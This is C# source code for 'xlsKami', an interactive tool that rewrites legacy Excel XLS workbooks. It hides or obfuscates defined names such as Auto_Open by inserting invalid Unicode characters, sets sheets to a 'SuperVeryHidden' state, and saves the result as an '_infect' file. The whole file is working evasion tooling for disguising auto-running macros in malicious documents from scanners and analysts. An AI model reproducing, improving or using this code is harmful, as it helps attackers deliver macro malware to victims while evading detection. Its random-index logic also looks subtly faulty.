using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.Spreadsheet.XlsFileFormat.Structures;
using b2xtranslator.StructuredStorage.Reader;
using b2xtranslator.xls.XlsFileFormat.Records;
using Macrome;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Text;

namespace xlsKami
{

    class Program
    {
        private static WorkbookStream LoadDecoyDocument(string decoyDocPath)
        {
            using (var fs = new FileStream(decoyDocPath, FileMode.Open))
            {
                StructuredStorageReader ssr = new StructuredStorageReader(fs);
                var wbStream = ssr.GetStream("Workbook");
                byte[] wbBytes = new byte[wbStream.Length];
                wbStream.Read(wbBytes, 0, wbBytes.Length, 0);

                WorkbookStream wbs = new WorkbookStream(wbBytes);
                return wbs;
            }
        }

        static void log(string str2log, ConsoleColor wordColor = ConsoleColor.White, params object[] args)
        {
            Console.ForegroundColor = wordColor;
            Console.Write(str2log, args);
            Console.ResetColor();
        }

        static string getObfscuteName(string localizedLabel)
        {
            string[] badUnicodeChars = { "\ufefe", "\uffff", "\ufeff", "\ufffe", "\uffef", "\ufff0", "\ufff1", "\ufff6", "\ufefd", "\u0000", "\udddd" };
            string unicodeLabelWithBadChars = "";
   
            //Characters that work
            //fefe, ffff, feff, fffe, ffef, fff0, fff1, fff6, fefd, 0000, dddd
            //Pretty much any character that is invalid unicode - though \ucccc doesn't seem to work - need better criteria for parsing

            foreach (char localizedLabelChar in localizedLabel)
            {
                int indexLabel = (new Random()).Next(localizedLabel.Length);
                for (var i = 0; i < 10; i += 1)
                    unicodeLabelWithBadChars += badUnicodeChars[indexLabel];
                unicodeLabelWithBadChars += localizedLabelChar;
            }
            return unicodeLabelWithBadChars;
        }

        static List<string> historyList = new List<string>();
        static WorkbookEditor cmd_ModifyLabel(WorkbookEditor wbe)
        {
            List<Lbl> existingLbls = wbe.WbStream.GetAllRecordsByType<Lbl>();
            log("\t[+] Detect {0} Labels ...\n", ConsoleColor.Yellow, existingLbls.Count);
            for (int i = 0; i < existingLbls.Count; i++)
            {           // XLUnicodeStringNoCch
                var labelName = existingLbls[i].IsAutoOpenLabel() ? "Auto_Open" : existingLbls[i].Name.Value;
                log("\t\t[{0}] {1:s}\n", ConsoleColor.Yellow, i, labelName);
            }

            log("\t[?] which one to midify (index): ", ConsoleColor.Yellow);
            try
            {
                int indx = Convert.ToInt32(Console.ReadLine());
                var labelName = existingLbls[indx].IsAutoOpenLabel() ? "Auto_Open" : existingLbls[indx].Name.Value;
                log("\t[v] select label `{0}`\n", ConsoleColor.Yellow, labelName);
                log("\t\t[1] hide label\n", ConsoleColor.Yellow);
                log("\t\t[2] obfuscate label\n", ConsoleColor.Yellow);
                log("\t[?] choose action (index): ", ConsoleColor.Yellow);

                var replaceLabelStringLbl = ((BiffRecord)existingLbls[indx].Clone()).AsRecordType<Lbl>();
                switch (Convert.ToInt32(Console.ReadLine())) {
                    case 1:
                        replaceLabelStringLbl.fHidden = true;
                        wbe.WbStream = wbe.WbStream.ReplaceRecord(existingLbls[indx], replaceLabelStringLbl);
                        wbe.WbStream = wbe.WbStream. FixBoundSheetOffsets();
                        historyList.Add(string.Format("[#] History - label `{0}` vanish!\n", labelName));
                        break;

                    case 2:
                        replaceLabelStringLbl.SetName(new XLUnicodeStringNoCch(getObfscuteName(labelName), true));
                        replaceLabelStringLbl.fBuiltin = false;
                        wbe.WbStream = wbe.WbStream.ReplaceRecord(existingLbls[indx], replaceLabelStringLbl);
                        wbe.WbStream = wbe.WbStream.FixBoundSheetOffsets();
                        historyList.Add(string.Format("[#] History - obfuscate `{0}` done!\n", labelName));
                        break;
                }
            }
            catch (Exception) {}
            return wbe;
        }

        static WorkbookEditor cmd_ModifySheet(WorkbookEditor wbe)
        {
            List<BoundSheet8> sheetList = wbe.WbStream.GetAllRecordsByType<BoundSheet8>();
            log("\t[+] Detect {0} Sheets ...\n", ConsoleColor.Yellow, sheetList.Count);
            for (int i = 0; i < sheetList.Count; i++)
                log("\t\t[{0}] {1:s}\n", ConsoleColor.Yellow, i, sheetList[i].stName.Value);
            log("\t[?] which one to hide (index): ", ConsoleColor.Yellow);
            try
            {
                int indx = Convert.ToInt32(Console.ReadLine());
                var replaceSheet = ((BiffRecord)sheetList[indx].Clone()).AsRecordType<BoundSheet8>();
                replaceSheet.hsState = BoundSheet8.HiddenState.SuperVeryHidden;
                wbe.WbStream = wbe.WbStream.ReplaceRecord(sheetList[indx], replaceSheet);
                wbe.WbStream = wbe.WbStream.FixBoundSheetOffsets();
                historyList.Add(string.Format("[#] History - Hide Sheet `{0}` done!\n", sheetList[indx].stName.Value));

            }
            catch { }
            return wbe;
        }

        static void printMenu(bool showMenu = false, string loadXlsPath = "")
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan; ;
            Console.WriteLine(xlsKami.Properties.Resources.banner);
            Console.WriteLine("   xlsKami [v1.]");
            Console.WriteLine("   Out-of-the-Box Tool to Obfuscate Excel 97-2003 XLS");
            Console.ResetColor();
            Console.WriteLine(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
            if (showMenu)
            {
                log("[v] Selected File: {0}\n", ConsoleColor.Magenta, loadXlsPath);
                log("[+] Menu \n", ConsoleColor.Cyan);
                log("\t[1] Masquerade Cell Labels\n", ConsoleColor.Cyan);
                log("\t[2] Masquerade Workbook Sheets\n", ConsoleColor.Cyan);
                log("\t[3] Save & Exit\n", ConsoleColor.Cyan);
                log("\t[4] Exit\n", ConsoleColor.Cyan);
                foreach (var szLog in historyList) log(szLog, ConsoleColor.Green);
                Console.WriteLine(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");

                log("[?] choose action (index): ", ConsoleColor.Cyan);
            }

        }

        static void Main(string[] args)
        {
            printMenu();
            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
            if (args.Length < 1) {
                log("usage: xlsKami.exe [path/to/xls]", ConsoleColor.Red);
                return;
            }

            WorkbookEditor wbe;


            try {
                wbe = new WorkbookEditor(LoadDecoyDocument(args[0]));
            }
            catch (Exception e) {
                log(e.Message, ConsoleColor.Red);
                return;
            }
            
            for (bool bye = false; !bye; ) {
                try {
                    printMenu(showMenu: true, loadXlsPath: args[0]);
                    
                    switch (Convert.ToInt32(Console.ReadLine())) {

                        case 1:
                            log("[+] Enter Mode: Label Patching\n", ConsoleColor.Cyan);
                            wbe = cmd_ModifyLabel(wbe);
                            log("[+] Exit Mode\n", ConsoleColor.Cyan);
                            break;

                        case 2:
                            log("[+] Enter Mode: Sheet Patching\n", ConsoleColor.Cyan);
                            wbe = cmd_ModifySheet(wbe);
                            log("[!] Exit Mode\n", ConsoleColor.Cyan);
                            break;

                        case 3:
                            WorkbookStream createdWorkbook = wbe.WbStream;
                            ExcelDocWriter writer = new ExcelDocWriter();
                            string outputPath = args[0].Insert(args[0].LastIndexOf('.'), "_infect");
                            Console.WriteLine("Writing generated document to {0}", outputPath);
                            writer.WriteDocument(outputPath, createdWorkbook, null);
                            bye = true;
                            break;

                        case 4:
                            bye = true;
                            break;


                    }
                }
                catch (Exception) { }
            }

            Console.WriteLine("Thanks for using xlsKami\nbye.\n");
        }
    }
}

